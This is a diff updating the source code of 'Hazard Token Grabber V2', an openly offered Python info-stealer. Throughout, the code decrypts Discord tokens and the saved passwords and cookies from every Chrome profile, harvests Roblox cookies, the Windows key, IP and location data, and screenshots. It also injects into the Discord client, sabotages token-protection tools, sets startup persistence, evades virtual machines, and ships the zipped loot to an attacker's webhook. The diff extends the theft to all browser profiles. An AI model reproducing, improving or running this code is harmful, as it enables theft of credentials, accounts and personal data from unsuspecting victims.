@@ -1,6 +1,8 @@
 import os
+import re
 import json
 import httpx
+import ntpath
 import winreg
 import ctypes
 import shutil
@@ -14,15 +16,14 @@ import subprocess
 from sys import argv
 from PIL import ImageGrab
 from base64 import b64decode
-from tempfile import mkdtemp
-from re import findall, match
 from Crypto.Cipher import AES
+from tempfile import mkdtemp, gettempdir
 from win32crypt import CryptUnprotectData
 
 __author__ = "Rdimo"
-__version__ = '1.8.0'
+__version__ = '1.8.1'
 __license__ = "GPL-3.0"
-config = {
+__config__ = {
     # replace WEBHOOK_HERE with your webhook ↓↓ or use the api from https://github.com/Rdimo/Discord-Webhook-Protector
     # Recommend using https://github.com/Rdimo/Discord-Webhook-Protector so your webhook can't be spammed or deleted
     'webhook': "WEBHOOK_HERE",
@@ -112,7 +113,7 @@ class Functions(object):
             decrypted_pass = decrypted_pass[:-16].decode()
             return decrypted_pass
         except Exception:
-            return "Failed to decrypt password"
+            return f'Failed to decrypt "{str(buff)}" | key: "{str(master_key)}"'
 
     @staticmethod
     def system_info() -> list:
@@ -131,7 +132,6 @@ class Functions(object):
                                              creationflags=0x08000000).decode().rstrip()
         except Exception:
             winver = "N/A"
-
         return [HWID, winver, wkey]
 
     @staticmethod
@@ -147,12 +147,11 @@ class Functions(object):
             org = data.get('org')
             loc = data.get('loc')
             googlemap = "https://www.google.com/maps/search/google+map++" + loc
-
         return [ip, city, country, region, org, loc, googlemap]
 
     @staticmethod
     def fetch_conf(e: str) -> str or bool | None:
-        return config.get(e)
+        return __config__.get(e)
 
 
 class HazardTokenGrabberV2(Functions):
@@ -161,19 +160,22 @@ class HazardTokenGrabberV2(Functions):
         self.discordApi = "https://discord.com/api/v9/users/@me"
         self.appdata = os.getenv("localappdata")
         self.roaming = os.getenv("appdata")
-        self.chrome = self.appdata + "\\Google\\Chrome\\User Data\\"
-        self.dir = mkdtemp()
+        self.chrome = ntpath.join(self.appdata, 'Google', 'Chrome', 'User Data')
+        self.dir, self.temp = mkdtemp(), gettempdir()
         inf, net = self.system_info(), self.network_info()
         self.hwid, self.winver, self.winkey = inf[0], inf[1], inf[2]
         self.ip, self.city, self.country, self.region, self.org, self.loc, self.googlemap = net[0], net[1], net[2], net[3], net[4], net[5], net[6]
-        self.startup_loc = self.roaming + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
+        self.startup_loc = ntpath.join(self.roaming, 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
+
         self.hook_reg = "api/webhooks"
+        self.chrome_reg = re.compile(r'^(profile\s\d*)|(default)|(guest profile)$', re.IGNORECASE | re.MULTILINE)
         self.regex = r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}"
         self.encrypted_regex = r"dQw4w9WgXcQ:[^\"]*"
 
         self.sep = os.sep
         self.tokens = []
         self.robloxcookies = []
+        self.chrome_key = self.get_master_key(ntpath.join(self.chrome, "Local State"))
 
         os.makedirs(self.dir, exist_ok=True)
 
@@ -199,7 +201,7 @@ class HazardTokenGrabberV2(Functions):
             self.tokens.append(tkn)
 
     async def init(self):
-        if self.webhook == "":
+        if self.webhook == "" or self.webhook == "WEBHOOK_HERE":
             os._exit(0)
         if self.fetch_conf('anti_debug') and AntiDebug().inVM:
             os._exit(0)
@@ -215,7 +217,7 @@ class HazardTokenGrabberV2(Functions):
         if self.fetch_conf('startup'):
             function_list.append(self.startup)
 
-        if os.path.exists(self.chrome + 'Default') and os.path.exists(self.chrome + 'Local State'):
+        if ntpath.exists(self.chrome):
             function_list.append(self.grabPassword)
             function_list.append(self.grabCookies)
 
@@ -244,14 +246,14 @@ class HazardTokenGrabberV2(Functions):
         for _dir in os.listdir(self.appdata):
             if 'discord' in _dir.lower():
                 discord = self.appdata + os.sep + _dir
-                for __dir in os.listdir(os.path.abspath(discord)):
-                    if match(r'app-(\d*\.\d*)*', __dir):
-                        app = os.path.abspath(os.path.join(discord, __dir))
-                        modules = os.path.join(app, 'modules')
+                for __dir in os.listdir(ntpath.abspath(discord)):
+                    if re.match(r'app-(\d*\.\d*)*', __dir):
+                        app = ntpath.abspath(ntpath.join(discord, __dir))
+                        modules = ntpath.join(app, 'modules')
                         for ___dir in os.listdir(modules):
-                            if match(r"discord_desktop_core-\d+", ___dir):
+                            if re.match(r"discord_desktop_core-\d+", ___dir):
                                 inj_path = modules + os.sep + ___dir + f'\\discord_desktop_core\\'
-                                if os.path.exists(inj_path):
+                                if ntpath.exists(inj_path):
                                     if self.startup_loc not in argv[0]:
                                         try:
                                             os.makedirs(inj_path + 'initiation', exist_ok=True)
@@ -286,7 +288,7 @@ class HazardTokenGrabberV2(Functions):
     async def bypassTokenProtector(self):
         # fucks up the discord token protector by https://github.com/andro2157/DiscordTokenProtector
         tp = f"{self.roaming}\\DiscordTokenProtector\\"
-        if not os.path.exists(tp):
+        if not ntpath.exists(tp):
             return
         config = tp + "config.json"
 
@@ -295,7 +297,7 @@ class HazardTokenGrabberV2(Functions):
                 os.remove(tp + i)
             except FileNotFoundError:
                 pass
-        if os.path.exists(config):
+        if ntpath.exists(config):
             with open(config, errors="ignore") as f:
                 try:
                     item = json.load(f)
@@ -322,7 +324,7 @@ class HazardTokenGrabberV2(Functions):
 
     async def bypassBetterDiscord(self):
         bd = self.roaming + "\\BetterDiscord\\data\\betterdiscord.asar"
-        if os.path.exists(bd):
+        if ntpath.exists(bd):
             x = self.hook_reg
             with open(bd, 'r', encoding="cp437", errors='ignore') as f:
                 txt = f.read()
@@ -348,7 +350,7 @@ class HazardTokenGrabberV2(Functions):
             'Sputnik': self.appdata + '\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\',
             'Vivaldi': self.appdata + '\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\',
             'Chrome SxS': self.appdata + '\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\',
-            'Chrome': self.chrome + 'Default\\Local Storage\\leveldb\\',
+            'Chrome': self.chrome + '\\Default\\Local Storage\\leveldb\\',
             'Epic Privacy Browser': self.appdata + '\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\',
             'Microsoft Edge': self.appdata + '\\Microsoft\\Edge\\User Data\\Defaul\\Local Storage\\leveldb\\',
             'Uran': self.appdata + '\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\',
@@ -358,16 +360,16 @@ class HazardTokenGrabberV2(Functions):
         }
 
         for name, path in paths.items():
-            if not os.path.exists(path):
+            if not ntpath.exists(path):
                 continue
             disc = name.replace(" ", "").lower()
             if "cord" in path:
-                if os.path.exists(self.roaming + f'\\{disc}\\Local State'):
+                if ntpath.exists(self.roaming + f'\\{disc}\\Local State'):
                     for file_name in os.listdir(path):
                         if file_name[-3:] not in ["log", "ldb"]:
                             continue
                         for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
-                            for y in findall(self.encrypted_regex, line):
+                            for y in re.findall(self.encrypted_regex, line):
                                 token = self.decrypt_val(b64decode(y.split('dQw4w9WgXcQ:')[1]), self.get_master_key(self.roaming + f'\\{disc}\\Local State'))
                                 asyncio.run(self.checkToken(token))
             else:
@@ -375,62 +377,70 @@ class HazardTokenGrabberV2(Functions):
                     if file_name[-3:] not in ["log", "ldb"]:
                         continue
                     for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
-                        for token in findall(self.regex, line):
+                        for token in re.findall(self.regex, line):
                             asyncio.run(self.checkToken(token))
 
-        if os.path.exists(self.roaming + "\\Mozilla\\Firefox\\Profiles"):
+        if ntpath.exists(self.roaming + "\\Mozilla\\Firefox\\Profiles"):
             for path, _, files in os.walk(self.roaming + "\\Mozilla\\Firefox\\Profiles"):
                 for _file in files:
                     if not _file.endswith('.sqlite'):
                         continue
                     for line in [x.strip() for x in open(f'{path}\\{_file}', errors='ignore').readlines() if x.strip()]:
-                        for token in findall(self.regex, line):
+                        for token in re.findall(self.regex, line):
                             asyncio.run(self.checkToken(token))
 
     @try_extract
     def grabPassword(self):
-        master_key = self.get_master_key(self.chrome + 'Local State')
-        login_db = self.chrome + 'default\\Login Data'
-        login = self.dir + self.sep + "Loginvault1.db"
+        f = open(self.dir + '\\Google Passwords.txt', 'w', encoding="cp437", errors='ignore')
+        for prof in os.listdir(self.chrome):
+            if re.match(self.chrome_reg, prof):
+                login_db = ntpath.join(self.chrome, prof, 'Login Data')
+                login = ntpath.join(self.temp, "Loginvault1.db")
 
-        shutil.copy2(login_db, login)
-        conn = sqlite3.connect(login)
-        cursor = conn.cursor()
-        with open(self.dir + "\\Google Passwords.txt", "w", encoding="cp437", errors='ignore') as f:
-            cursor.execute("SELECT action_url, username_value, password_value FROM logins")
-            for r in cursor.fetchall():
-                url = r[0]
-                username = r[1]
-                encrypted_password = r[2]
-                decrypted_password = self.decrypt_val(encrypted_password, master_key)
-                if url != "":
-                    f.write(f"Domain: {url}\nUser: {username}\nPass: {decrypted_password}\n\n")
-        cursor.close()
-        conn.close()
-        os.remove(login)
+                shutil.copy2(login_db, login)
+                conn = sqlite3.connect(login)
+                cursor = conn.cursor()
+                cursor.execute("SELECT action_url, username_value, password_value FROM logins")
+
+                for r in cursor.fetchall():
+                    url = r[0]
+                    username = r[1]
+                    encrypted_password = r[2]
+                    decrypted_password = self.decrypt_val(encrypted_password, self.chrome_key)
+                    if url != "":
+                        f.write(f"Domain: {url}\nUser: {username}\nPass: {decrypted_password}\n\n")
+
+                cursor.close()
+                conn.close()
+                os.remove(login)
+        f.close()
 
     @try_extract
     def grabCookies(self):
-        master_key = self.get_master_key(self.chrome + 'Local State')
-        login_db = self.chrome + 'default\\Network\\cookies'
-        login = self.dir + self.sep + "Loginvault2.db"
+        f = open(self.dir + '\\Google Cookies.txt', 'w', encoding="cp437", errors='ignore')
+        for prof in os.listdir(self.chrome):
+            if re.match(self.chrome_reg, prof):
+                login_db = ntpath.join(self.chrome, prof, 'Network', 'cookies')
+                login = ntpath.join(self.temp, "Loginvault2.db")
 
-        shutil.copy2(login_db, login)
-        conn = sqlite3.connect(login)
-        cursor = conn.cursor()
-        with open(self.dir + "\\Google Cookies.txt", "w", encoding="cp437", errors='ignore') as f:
-            cursor.execute("SELECT host_key, name, encrypted_value from cookies")
-            for r in cursor.fetchall():
-                host = r[0]
-                user = r[1]
-                decrypted_cookie = self.decrypt_val(r[2], master_key)
-                if host != "":
-                    f.write(f"Host: {host}\nUser: {user}\nCookie: {decrypted_cookie}\n\n")
-                if '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_' in decrypted_cookie:
-                    self.robloxcookies.append(decrypted_cookie)
-        cursor.close()
-        conn.close()
-        os.remove(login)
+                shutil.copy2(login_db, login)
+                conn = sqlite3.connect(login)
+                cursor = conn.cursor()
+                cursor.execute("SELECT host_key, name, encrypted_value from cookies")
+
+                for r in cursor.fetchall():
+                    host = r[0]
+                    user = r[1]
+                    decrypted_cookie = self.decrypt_val(r[2], self.chrome_key)
+                    if host != "":
+                        f.write(f"HOST KEY: {host} | NAME: {user} | VALUE: {decrypted_cookie}\n")
+                    if '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_' in decrypted_cookie:
+                        self.robloxcookies.append(decrypted_cookie)
+
+                cursor.close()
+                conn.close()
+                os.remove(login)
+        f.close()
 
     def neatifyTokens(self):
         f = open(self.dir + "\\Discord Info.txt", "w", encoding="cp437", errors='ignore')
@@ -501,24 +511,25 @@ class HazardTokenGrabberV2(Functions):
         image.close()
 
     def sys_dump(self):
+        line_sep = "=" * 50
         about = f"""
-==========================
+{line_sep}
 {Victim} | {Victim_pc}
-==========================
+{line_sep}
 Windows key: {self.winkey}
 Windows version: {self.winver}
-==========================
+{line_sep}
 RAM: {ram}GB
 DISK: {disk}GB
 HWID: {self.hwid}
-==========================
+{line_sep}
 IP: {self.ip}
 City: {self.city}
 Country: {self.country}
 Region: {self.region}
 Org: {self.org}
 GoogleMaps: {self.googlemap}
-==========================
+{line_sep}
         """
         with open(self.dir + "\\System info.txt", "w", encoding="utf-8", errors='ignore') as f:
             f.write(about)
@@ -538,12 +549,12 @@ GoogleMaps: {self.googlemap}
                         with open(path, "a", encoding="utf-8", errors="ignore") as fp:
                             fp.write(x + "\n\n🌟・Grabber By github.com/Rdimo・https://github.com/Rdimo/Hazard-Token-Grabber-V2")
 
-        _zipfile = os.path.join(self.appdata, f'Hazard.V2-[{Victim}].zip')
+        _zipfile = ntpath.join(self.appdata, f'Hazard.V2-[{Victim}].zip')
         zipped_file = zipfile.ZipFile(_zipfile, "w", zipfile.ZIP_DEFLATED)
-        abs_src = os.path.abspath(self.dir)
+        abs_src = ntpath.abspath(self.dir)
         for dirname, _, files in os.walk(self.dir):
             for filename in files:
-                absname = os.path.abspath(os.path.join(dirname, filename))
+                absname = ntpath.abspath(ntpath.join(dirname, filename))
                 arcname = absname[len(abs_src) + 1:]
                 zipped_file.write(absname, arcname)
         zipped_file.close()
@@ -668,7 +679,7 @@ class AntiDebug(Functions):
 
     def listCheck(self):
         for path in [r'D:\Tools', r'D:\OS2', r'D:\NT3X']:
-            if os.path.exists(path):
+            if ntpath.exists(path):
                 self.programExit()
 
         for user in self.blackListedUsers:
